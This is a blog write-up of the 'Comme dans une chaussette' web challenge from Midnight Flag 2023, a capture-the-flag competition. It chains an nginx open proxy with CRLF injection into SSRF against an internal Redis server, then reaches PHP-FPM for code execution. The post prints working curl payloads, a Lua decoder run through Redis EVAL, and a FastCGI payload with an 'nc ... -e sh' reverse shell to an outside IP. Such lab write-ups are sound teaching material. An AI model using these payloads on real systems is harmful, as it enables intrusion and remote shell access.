---
source: kevin-mizu
source_url: https://mizu.re/post/comme-dans-une-chaussette
title: "Comme dans une chaussette | mizu.re"
description: "Comme dans une chaussette"
---

_keyboard\_arrow\_up_

title: Comme dans une chaussette

date: Apr 16, 2023

tags: [Writeup](https://mizu.re/tag/Writeup) [Web](https://mizu.re/tag/Web) [RCE](https://mizu.re/tag/RCE) [midnightflag2023](https://mizu.re/tag/midnightflag2023)

# Comme dans une chaussette

![logo.png](https://mizu.re/articles/writeups/midnight_flag_2023/comme_dans_une_chaussette/images/logo.png)

* * *

Difficulty: 496 points \| 6 solves

Description: A company that proposes to sanitize inputs for you, does that tempt you?

This is the beta version, and I heard that they log everything to train their AI model.

Take control of the server to check if all this is true!

Additional information:

Sources: [comme\_dans\_une\_chaussette.zip](https://mizu.re/articles/writeups/midnight_flag_2023/comme_dans_une_chaussette/comme_dans_une_chaussette.zip)

You have all the files in the .zip provided to you (the flag file name as well as the webroot changes on the remote), there is no point in attacking the challenge directly if you don't have a working payload locally.

To launch the challenge on your computer:

```bash
unzip as_in_a_sock.zip && docker-compose up -d --build
```

Author: [Worty](https://twitter.com/_worty)

* * *

## Table of content

- [🕵️ Recon](https://mizu.re/post/comme-dans-une-chaussette#%EF%B8%8F-recon)
- [⏩ Open proxy](https://mizu.re/post/comme-dans-une-chaussette#-open-proxy)
- [🟥 Redis](https://mizu.re/post/comme-dans-une-chaussette#-redis)
- [💥 RCE with PHP-FPM](https://mizu.re/post/comme-dans-une-chaussette#-rce-with-php-fpm)
- [🧩 Bringing all together](https://mizu.re/post/comme-dans-une-chaussette#-bringing-all-together)
- [🚩 Getting the flag!!!](https://mizu.re/post/comme-dans-une-chaussette#-getting-the-flag)

## 🕵️ Recon

This web challenge exposes a simple web application which provides parameters sanitization. All the [source](https://mizu.re/articles/writeups/midnight_flag_2023/comme_dans_une_chaussette/comme_dans_une_chaussette.zip) code information is given with which makes it possible to build it locally.

![home.png](https://mizu.re/articles/writeups/midnight_flag_2023/comme_dans_une_chaussette/images/home.png)

Looking into the application source code makes possible to quickly see that there is nothing to do with the web application. Indeed, the challenge isn't limited to the PHP application.

- Tree:

![tree.png](https://mizu.re/articles/writeups/midnight_flag_2023/comme_dans_une_chaussette/images/tree.png)

- src/Dockerfile:

```dockerfile
FROM richarvey/nginx-php-fpm:latest

WORKDIR /root
RUN apk add make gcc musl-dev
RUN wget http://download.redis.io/redis-stable.tar.gz && \
    tar xvzf redis-stable.tar.gz && \
    cd redis-stable/deps/ && \
    make lua hiredis linenoise jemalloc && \
    cd .. && \
    make && \
    cp src/redis-server /usr/local/bin/

COPY ./nginx/default.conf /etc/nginx/sites-available/
COPY ./nginx/nginx.conf /etc/nginx/
COPY ./www/ /var/www/html/
COPY ./www.conf.default /usr/local/etc/php-fpm.d/
COPY ./zz-docker.conf /usr/local/etc/php-fpm.d/
COPY ./start.sh /root
COPY ./redis_logger.py /root
COPY ./flag.txt /

RUN apk add python3 && \
    pip3 install redis && \
    echo "* * * * * python3 /root/redis_logger.py '127.0.0.1'" > /var/spool/cron/crontabs/root && \
    crontab /var/spool/cron/crontabs/root

CMD ["bash","/root/start.sh"]
```

As we can see from the above screenshot, the application uses [PHP-FPM FastCGI](https://www.php.net/manual/en/install.fpm.php) to execute PHP scripts depending on requests made to an [nginx proxy](https://docs.nginx.com/nginx/admin-guide/web-server/reverse-proxy/). In addition, a redis server seems to be used to mailing schedule tasks via redis\_logger.py crontab.

- src/redis\_logger.py

```python
import redis
import sys
import socket

host = sys.argv[1]
port = 6379

try:
    r = redis.Redis(host=host, port=port, db=0)
except:
    f = open("/root/redis_error","w")
    f.write("[-] Unable to join redis instance\n")
    f.close()
    exit(-1)

for key in r.keys():
    data = r.get(key)
    #send the data to the php-fpm to send email
    sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    sock.connect("/var/run/php-fpm.sock")
    sock.sendall(data)
```

## ⏩ Open proxy

Looking into nginx configuration can be a good start to go as it is the entry point of our HTTP queries.

- nginx/default.conf

```python
server {
    listen   80;
    listen   [::]:80 default ipv6only=on;

    root /var/www/html;
    index index.php index.html index.htm;

    ...

    #dev endpoint to reach internal dev environment, check here to not be used by users
    location /dev/ {
        allow 127.0.0.1;
        deny all;
    }

    location ~ /dev/(.*)/(.*) {
        resolver 172.20.0.1;

        proxy_pass http://$1$uri;
        proxy_set_header Host $1;
    }

}
```

_I have removed useless part of the configuration._

In the above configuration file, something might have caught your eyes: proxy\_pass [http://$1$uri](http://$1$uri/). Actually, we control the URL which is used inside the nginx [proxy\_pass](https://docs.nginx.com/nginx/admin-guide/web-server/reverse-proxy/) directive. In addition, the regex used to catch our input is very permissive and allows to use any chars we want.

> Nice but, how could this configuration be useful in the challenge context?

In fact, this configuration is vulnerable to open proxy which allows us to interact directly with the internal network. In addition, proxy\_pass directive has an interesting property: it URL decode any bytes which pass the regex and copy them to the subquery! Thus, thanks to it, we might be able to interact with the internal redis server!

```bash
curl http://localhost/dev/127.0.0.1:4444/%0D%0AI%20control%20the%20request0D%0AX-Header:%20
```

![CRLF.png](https://mizu.re/articles/writeups/midnight_flag_2023/comme_dans_une_chaussette/images/CRLF.png)

## 🟥 Redis

Now that we know how to abuse the open proxy vulnerability to hit the internal, we need to find a way to abuse it to control redis keys.

> That's a good idea, but I heard that it wasn't possible anymore to SSRF to redis :/

This isn't 100% right, in fact, mitigations that have been implemented by nginx team only close the connection in these cases: ( [source](https://github.com/redis/redis/blob/5e8caca0366e5fdf5fc36292c86964360203de77/src/server.c#L983) \| [great research](https://labs.detectify.com/2021/02/18/middleware-middleware-everywhere-and-lots-of-misconfigurations-to-fix/))

- The line starts with POST.
- The line starts with Host:.

Thus, any injection before Host: header with a non POST method is processed by the redis server! For example, the following HTTP query would be valid for redis:

- Internal request sended:

```bash
curl -X MSET http://localhost/dev/127.0.0.1:4444/random%201%20a%201%0D%0ASET%20b%202%0D%0AX-Header:%20
```

![CRLF2.png](https://mizu.re/articles/writeups/midnight_flag_2023/comme_dans_une_chaussette/images/CRLF2.png)

_Notice that nginx properly forward the requested method!_

- `Redis interaction`:

```bash
curl -X MSET http://localhost/dev/127.0.0.1:6379/random%201%20a%201%0D%0ASET%20b%202%0D%0AX-Header:%20
```

![redisCRLF.png](https://mizu.re/articles/writeups/midnight_flag_2023/comme_dans_une_chaussette/images/redisCRLF.png)

## 💥 RCE with PHP-FPM

The next step in the exploitation is to find a way to get the flag thanks to this injection. It is important to know that RCE via redis EVAL command are only possible if a lua sandbox bypass exists which is not the case for the host configuration at the time of the CTF. So, a good way to continue is to take a look into the redis\_logger.py crontab.

- /var/spool/cron/crontabs/root

```
* * * * * python3 /root/redis_logger.py '127.0.0.1'
```

- src/redis\_logger.py

```py
import redis
import sys
import socket

host = sys.argv[1]
port = 6379

try:
    r = redis.Redis(host=host, port=port, db=0)
except:
    f = open("/root/redis_error","w")
    f.write("[-] Unable to join redis instance\n")
    f.close()
    exit(-1)

for key in r.keys():
    data = r.get(key)
    #send the data to the php-fpm to send email
    sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    sock.connect("/var/run/php-fpm.sock")
    sock.sendall(data)
```

As we can see, the redis\_logger.py script is executed each 1 minute. Basically, the script takes all redis keys and send their values into the php-fpm socket. This setup is really interesting for us because, the [Gopherus](https://github.com/tarunkant/Gopherus) tool provides a fast way to generate RCE payload in case we:

- Can communicate with FastCGI. (PHP-FPM in our case)
- Known the name of one .php script on the system.

And yes, We have everything go to go further! 🔥

![gopherus.png](https://mizu.re/articles/writeups/midnight_flag_2023/comme_dans_une_chaussette/images/gopherus.png)

Firstly, we can try this payload from the docker challenge:

```python
from urllib.parse import unquote
import socket

payload = unquote("%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH79%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00O%04%00%3C%3Fphp%20system%28%27nc%2054.36.103.138%205555%20-e%20sh%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00")

sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM);
sock.connect("/var/run/php-fpm.sock")
sock.sendall(payload.encode())
```

![php-fpm-rce.png](https://mizu.re/articles/writeups/midnight_flag_2023/comme_dans_une_chaussette/images/php-fpm-rce.png)

Et voila 🎉 We get the last brick the challenge!

## 🧩 Bringing all together

Now, it is time to forge the final payload that is going to be used on the remote server! So, if we recap, we need to:

1. Abuse proxy\_pass to query the internal network.
2. Thanks to request CRLF, generate a valid redis payload to set our php-fpm payload into it.
3. Wait the cron :)

> Hummmm... You sure? because locally my nginx refuse the payload...

![nginx_error.png](https://mizu.re/articles/writeups/midnight_flag_2023/comme_dans_une_chaussette/images/nginx_error.png)

Yes... this because according to the URI RFC, a URL can't contain NULL bytes. To override this restriction, we have several possibilities:

- Use the fact that \\x{HEX} values are converted to bytes by REDIS ( [@\_worty](https://twitter.com/_worty) tips).
- Use the redis EVAL function to write a lua decoder.
- ...

As I wasn't aware that the first possibility was even possible from nginx during the CTF, I used the second option:

- lua code

```lua
local hs = "48656c6c6f20576f726c64"; local ds = ""; for i=1,#hs,2 do local byte = tonumber(hs:sub(i,i+1), 16); ds = ds .. string.char(byte); end;
```

- redis command

```lua
EVAL 'local hs = "48656c6c6f20576f726c64"; local ds = ""; for i=1,#hs,2 do local byte = tonumber(hs:sub(i,i+1), 16); ds = ds .. string.char(byte); end; redis.call("SET", "a", ds)' 0
```

Thus, thanks to the `EVAL` command, it is possible to decode and set the byte output into a `redis` variable!

- Setup payload

```python
from urllib.parse import unquote
from base64 import b16encode

payload = unquote("%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH79%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00O%04%00%3C%3Fphp%20system%28%27nc%2054.36.103.138%205555%20-e%20sh%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00")

b16encode(payload.encode())
```

- Final payload

```bash
curl -X MSET "http://localhost/dev/127.0.0.1:6379/a%0D%0AEVAL%20%27local%20hs%20%3D%20%22{{HEX-PAYLOAD-HERE}}%22%3B%20local%20ds%20%3D%20%22%22%3B%20for%20i%3D1%2C%23hs%2C2%20do%20local%20byte%20%3D%20tonumber%28hs%3Asub%28i%2Ci%2B1%29%2C%2016%29%3B%20ds%20%3D%20ds%20..%20string.char%28byte%29%3B%20end%3B%20redis.call%28%22SET%22%2C%20%22a%22%2C%20ds%29%27%200%0D%0AX:"
```

![final_payload.png](https://mizu.re/articles/writeups/midnight_flag_2023/comme_dans_une_chaussette/images/final_payload.png)

## 🚩 Getting the flag!!!

![flag.png](https://mizu.re/articles/writeups/midnight_flag_2023/comme_dans_une_chaussette/images/flag.png)

- Flag: MCTF{cl4ss1c\_ssrf\_r3d1s\_t0\_rc3\_thx\_php\_fpm\_<3}
🎉

[_keyboard\_arrow\_left_ Tweedle Dee](https://mizu.re/post/tweedle-dee)

[Intigriti March 2023 - XSS Challenge _keyboard\_arrow\_right_](https://mizu.re/post/intigriti-march-2023-xss-challenge)